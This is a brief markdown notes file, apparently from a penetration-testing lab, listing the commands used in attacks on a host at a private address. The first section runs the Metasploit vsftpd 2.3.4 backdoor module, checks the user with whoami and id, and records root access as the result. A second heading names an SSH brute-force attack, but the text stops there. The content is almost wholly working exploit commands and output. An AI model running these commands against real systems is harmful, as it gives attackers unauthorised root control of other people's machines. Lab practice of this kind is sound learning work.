# Commands Used

## Attack 1: vsftpd Backdoor (Root Access)

```bash
sudo msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.1.3
run
whoami
id

**Result:** uid=0(root)

---

## Attack 2: SSH Brute Force
